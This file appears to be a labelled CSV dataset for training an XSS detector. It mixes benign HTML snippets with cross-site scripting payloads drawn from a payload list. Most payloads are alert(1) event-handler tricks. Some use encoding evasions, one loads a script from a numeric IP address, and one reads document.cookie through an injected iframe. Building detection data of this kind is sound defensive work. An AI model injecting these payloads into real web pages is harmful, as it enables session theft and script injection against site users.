text,label,source,length,timestamp
"<input onkeyup=""alert(1)"" contenteditable>test</input>",1,payloadbox,54,2026-03-01T13:13:37.389686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.405009
"<style>:target {color:red;}</style><font id=x style=""transition:color 1s"" ontransitionend=alert(1)></font>",1,payloadbox,106,2026-03-01T13:13:37.392697
"<datalist onkeydown=""alert(1)"" contenteditable>test</datalist>",1,payloadbox,62,2026-03-01T13:13:37.387778
"<ins ondblclick=""alert(1)"">test</ins>",1,payloadbox,37,2026-03-01T13:13:37.389686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.403007
<datalist id=x tabindex=1 onfocus=alert(1)></datalist>,1,payloadbox,54,2026-03-01T13:13:37.387778
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.410992
"<head onmouseenter=""alert(1)"">test</head>",1,payloadbox,41,2026-03-01T13:13:37.388686
<span class='class-6014'>Services</span>,0,generated,40,2026-03-01T13:13:37.414992
<p>About</p>,0,generated,12,2026-03-01T13:13:37.405009
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.397682
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.405009
<p>About</p>,0,generated,12,2026-03-01T13:13:37.414992
<track id=x tabindex=1 onfocus=alert(1)></track>,1,payloadbox,48,2026-03-01T13:13:37.394683
<optgroup onfocusout=alert(1) tabindex=1 id=x></optgroup><input autofocus>,1,payloadbox,74,2026-03-01T13:13:37.390697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.408990
"<embed onpaste=""alert(1)"" contenteditable>test</embed>",1,payloadbox,54,2026-03-01T13:13:37.388686
"<font ondblclick=""alert(1)"">test</font>",1,payloadbox,39,2026-03-01T13:13:37.388686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.403996
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.403007
<p>About</p>,0,generated,12,2026-03-01T13:13:37.399984
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.397682
"<fieldset oncontextmenu=""alert(1)"">test</fieldset>",1,payloadbox,50,2026-03-01T13:13:37.388686
<center id=x tabindex=1 onfocusin=alert(1)></center>,1,payloadbox,52,2026-03-01T13:13:37.386686
<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>,1,payloadbox,72,2026-03-01T13:13:37.391686
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.403007
"<nav onmouseover=""alert(1)"">test</nav>",1,payloadbox,38,2026-03-01T13:13:37.390697
"<aside ondblclick=""alert(1)"">test</aside>",1,payloadbox,41,2026-03-01T13:13:37.385678
"<dfn onkeydown=""alert(1)"" contenteditable>test</dfn>",1,payloadbox,52,2026-03-01T13:13:37.387778
"<col onpaste=""alert(1)"" contenteditable>test</col>",1,payloadbox,50,2026-03-01T13:13:37.386686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.407992
"<template match=""/"">",1,payloadbox,20,2026-03-01T13:13:37.396686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.403007
<A href=javas%26#99;ript:alert(1)>click,1,payloadbox,39,2026-03-01T13:13:37.396686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.398687
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.396686
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.401989
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.401989
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.413993
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.399984
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meta id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></meta>",1,payloadbox,178,2026-03-01T13:13:37.393697
"<center onmouseleave=""alert(1)"">test</center>",1,payloadbox,45,2026-03-01T13:13:37.386686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.413993
"<shadow oncut=""alert(1)"" contenteditable>test</shadow>",1,payloadbox,54,2026-03-01T13:13:37.391686
"<blink onkeyup=""alert(1)"" contenteditable>test</blink>",1,payloadbox,54,2026-03-01T13:13:37.386686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.403007
"<u onbeforecopy=""alert(1)"" contenteditable>test</u>",1,payloadbox,51,2026-03-01T13:13:37.395688
<HTML><BODY>,1,payloadbox,12,2026-03-01T13:13:37.396686
"<figcaption onclick=""alert(1)"">test</figcaption>",1,payloadbox,48,2026-03-01T13:13:37.388686
<button onfocusout=alert(1) id=x></button><input autofocus>,1,payloadbox,59,2026-03-01T13:13:37.386686
"<param ondblclick=""alert(1)"">test</param>",1,payloadbox,41,2026-03-01T13:13:37.391686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.405991
"<frame onmousedown=""alert(1)"">test</frame>",1,payloadbox,42,2026-03-01T13:13:37.388686
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.411988
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.413993
<script src=//3334957647/1>,1,payloadbox,27,2026-03-01T13:13:37.385678
<span class='class-584'>Services</span>,0,generated,39,2026-03-01T13:13:37.398687
"<section draggable=""true"" ondragleave=""alert(1)"">test</section>",1,payloadbox,63,2026-03-01T13:13:37.391686
"<cite onbeforecut=""alert(1)"" contenteditable>test</cite>",1,payloadbox,56,2026-03-01T13:13:37.386686
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.397682
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.398687
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.414992
"<style>:target {color: red;}</style><command id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></command>",1,payloadbox,117,2026-03-01T13:13:37.392697
"<menuitem draggable=""true"" ondragend=""alert(1)"">test</menuitem>",1,payloadbox,63,2026-03-01T13:13:37.390697
<select autofocus onfocusin=alert(1)>,1,payloadbox,37,2026-03-01T13:13:37.391686
"<datalist onmouseleave=""alert(1)"">test</datalist>",1,payloadbox,49,2026-03-01T13:13:37.387778
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.411988
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.403007
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.400996
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.406989
"<applet onbeforecopy=""alert(1)"" contenteditable>test</applet>",1,payloadbox,61,2026-03-01T13:13:37.385678
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.405991
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.398687
<span class='class-5114'>Services</span>,0,generated,40,2026-03-01T13:13:37.411988
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,1,payloadbox,43,2026-03-01T13:13:37.396686
"<spacer onmouseup=""alert(1)"">test</spacer>",1,payloadbox,42,2026-03-01T13:13:37.392697
"<nav draggable=""true"" ondrag=""alert(1)"">test</nav>",1,payloadbox,50,2026-03-01T13:13:37.390697
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.413993
"<style>:target {color:red;}</style><td id=x style=""transition:color 1s"" ontransitionend=alert(1)></td>",1,payloadbox,102,2026-03-01T13:13:37.392697
<p>About</p>,0,generated,12,2026-03-01T13:13:37.399984
<svg><xss onload=alert(1)></xss>,1,payloadbox,32,2026-03-01T13:13:37.394683
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.400996
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.398687
"<style>:target {color: red;}</style><dd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dd>",1,payloadbox,107,2026-03-01T13:13:37.392697
<select onblur=alert(1) id=x></select><input autofocus>,1,payloadbox,55,2026-03-01T13:13:37.391686
<span class='class-2144'>Services</span>,0,generated,40,2026-03-01T13:13:37.403007
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.397682
"<optgroup onbeforepaste=""alert(1)"" contenteditable>test</optgroup>",1,payloadbox,66,2026-03-01T13:13:37.390697
"<div draggable=""true"" contenteditable>drag me</div><b ondragover=alert(1) contenteditable>drop here</b>",1,payloadbox,103,2026-03-01T13:13:37.387778
<noembed id=x tabindex=1 onbeforedeactivate=alert(1)></noembed><input autofocus>,1,payloadbox,80,2026-03-01T13:13:37.390697
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.400996
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.403007
<p>About</p>,0,generated,12,2026-03-01T13:13:37.401989
"<code draggable=""true"" ondrag=""alert(1)"">test</code>",1,payloadbox,52,2026-03-01T13:13:37.386686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.414992
"<div id=""127""><svg xmlns=""http://www.w3.org/2000/svg"" id=""x"">",1,payloadbox,61,2026-03-01T13:13:37.396686
"<rp onmouseenter=""alert(1)"">test</rp>",1,payloadbox,37,2026-03-01T13:13:37.391686
<center onfocusout=alert(1) tabindex=1 id=x></center><input autofocus>,1,payloadbox,70,2026-03-01T13:13:37.386686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.399984
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.414992
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.398687
<p>About</p>,0,generated,12,2026-03-01T13:13:37.405009
"<style>@keyframes slidein {}</style><b style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></b>",1,payloadbox,156,2026-03-01T13:13:37.392697
<map id=x tabindex=1 onfocusin=alert(1)></map>,1,payloadbox,46,2026-03-01T13:13:37.389686
"<map oncut=""alert(1)"" contenteditable>test</map>",1,payloadbox,48,2026-03-01T13:13:37.389686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.414992
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.409991
"<tt onbeforecut=""alert(1)"" contenteditable>test</tt>",1,payloadbox,52,2026-03-01T13:13:37.394683
"<basefont onbeforecopy=""alert(1)"" contenteditable>test</basefont>",1,payloadbox,65,2026-03-01T13:13:37.385678
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.411988
<span class='class-3944'>Services</span>,0,generated,40,2026-03-01T13:13:37.407992
"<style>:target {color:red;}</style><dl id=x style=""transition:color 1s"" ontransitionend=alert(1)></dl>",1,payloadbox,102,2026-03-01T13:13:37.392697
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.412991
"<style>:target {color: red;}</style><html id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></html>",1,payloadbox,111,2026-03-01T13:13:37.392697
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.411988
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.408990
"<progress onbeforepaste=""alert(1)"" contenteditable>test</progress>",1,payloadbox,66,2026-03-01T13:13:37.391686
"<element onmouseenter=""alert(1)"">test</element>",1,payloadbox,47,2026-03-01T13:13:37.388686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.408990
"<frame draggable=""true"" ondrag=""alert(1)"">test</frame>",1,payloadbox,54,2026-03-01T13:13:37.388686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.411988
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.398687
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.400996
"<shadow onbeforecut=""alert(1)"" contenteditable>test</shadow>",1,payloadbox,60,2026-03-01T13:13:37.391686
"<u onmouseup=""alert(1)"">test</u>",1,payloadbox,32,2026-03-01T13:13:37.395688
<figcaption id=x tabindex=1 ondeactivate=alert(1)></figcaption><input id=y autofocus>,1,payloadbox,85,2026-03-01T13:13:37.388686
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.413993
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.415994
"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>",1,payloadbox,366,2026-03-01T13:13:37.395688
"<style>:target {transform: rotate(180deg);}</style><spacer id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></spacer>",1,payloadbox,130,2026-03-01T13:13:37.392697
<span class='class-2334'>Services</span>,0,generated,40,2026-03-01T13:13:37.403007
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><isindex id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></isindex>",1,payloadbox,184,2026-03-01T13:13:37.393697
<p>About</p>,0,generated,12,2026-03-01T13:13:37.412991
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.397682
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.411988
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.398687
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.407992
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.408990
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.409991
<script src=javascript:alert(1)>,1,payloadbox,32,2026-03-01T13:13:37.385678
"<i onmouseout=""alert(1)"">test</i>",1,payloadbox,33,2026-03-01T13:13:37.389686
"<div id=""89""><svg xmlns=""http://www.w3.org/2000/svg"">",1,payloadbox,53,2026-03-01T13:13:37.396686
<span class='class-2264'>Services</span>,0,generated,40,2026-03-01T13:13:37.403007
<audio onfocusout=alert(1) tabindex=1 id=x></audio><input autofocus>,1,payloadbox,68,2026-03-01T13:13:37.385678
"<style>:target {transform: rotate(180deg);}</style><bdo id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bdo>",1,payloadbox,124,2026-03-01T13:13:37.392697
<svg><li onload=alert(1)></li>,1,payloadbox,30,2026-03-01T13:13:37.394683
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.401989
"<div id=""40""><style><img src=""</style><img src=x onerror=alert(40)//"">//[""'`-->]]>]</div>",1,payloadbox,89,2026-03-01T13:13:37.396686
<span class='class-6114'>Services</span>,0,generated,40,2026-03-01T13:13:37.414992
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.412991
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.411988
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.408990
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.406989
"<div draggable=""true"" contenteditable>drag me</div><nobr ondrop=alert(1) contenteditable>drop here</nobr>",1,payloadbox,105,2026-03-01T13:13:37.387778
"<title onmouseleave=""alert(1)"">test</title>",1,payloadbox,43,2026-03-01T13:13:37.394683
"<acronym onpaste=""alert(1)"" contenteditable>test</acronym>",1,payloadbox,58,2026-03-01T13:13:37.385678
<br id=x tabindex=1 onbeforeactivate=alert(1)></br>,1,payloadbox,51,2026-03-01T13:13:37.386686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.409991
<multicol id=x tabindex=1 onbeforeactivate=alert(1)></multicol>,1,payloadbox,63,2026-03-01T13:13:37.390697
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.414992
<code id=x tabindex=1 ondeactivate=alert(1)></code><input id=y autofocus>,1,payloadbox,73,2026-03-01T13:13:37.386686
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><font id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></font>",1,payloadbox,178,2026-03-01T13:13:37.393697
<svg/onload=alert(1),1,payloadbox,20,2026-03-01T13:13:37.395688
<span class='class-374'>Services</span>,0,generated,39,2026-03-01T13:13:37.397682
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.409991
<textarea onauxclick=alert(1)>XSS</textarea>,1,payloadbox,44,2026-03-01T13:13:37.394683
<menu id=x tabindex=1 onfocus=alert(1)></menu>,1,payloadbox,46,2026-03-01T13:13:37.390697
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.412991
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.403007
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.403007
<p>About</p>,0,generated,12,2026-03-01T13:13:37.414992
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.403007
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.398687
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.408990
"<div draggable=""true"" contenteditable>drag me</div><style ondragover=alert(1) contenteditable>drop here</style>",1,payloadbox,111,2026-03-01T13:13:37.387778
"<td onkeypress=""alert(1)"" contenteditable>test</td>",1,payloadbox,51,2026-03-01T13:13:37.394683
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.415994
"<h1 onkeydown=""alert(1)"" contenteditable>test</h1>",1,payloadbox,50,2026-03-01T13:13:37.388686
<em id=x tabindex=1 onactivate=alert(1)></em>,1,payloadbox,45,2026-03-01T13:13:37.388686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.399984
<frameset id=x tabindex=1 onbeforeactivate=alert(1)></frameset>,1,payloadbox,63,2026-03-01T13:13:37.388686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.405009
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.405009
"<dir draggable=""true"" ondragleave=""alert(1)"">test</dir>",1,payloadbox,55,2026-03-01T13:13:37.387778
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.408990
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.405009
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.397682
<span class='class-4434'>Services</span>,0,generated,40,2026-03-01T13:13:37.409991
"<style>:target {transform: rotate(180deg);}</style><th id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></th>",1,payloadbox,122,2026-03-01T13:13:37.392697
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.406989
"<plaintext oncontextmenu=""alert(1)"">test</plaintext>",1,payloadbox,52,2026-03-01T13:13:37.391686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.415994
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.410992
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.403996
"<div draggable=""true"" contenteditable>drag me</div><small ondrop=alert(1) contenteditable>drop here</small>",1,payloadbox,107,2026-03-01T13:13:37.387778
"<nav draggable=""true"" ondragstart=""alert(1)"">test</nav>",1,payloadbox,55,2026-03-01T13:13:37.390697
"<style>:target {transform: rotate(180deg);}</style><blockquote id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></blockquote>",1,payloadbox,138,2026-03-01T13:13:37.392697
<image src/onerror=alert(1)>,1,payloadbox,28,2026-03-01T13:13:37.389686
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.403996
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.403007
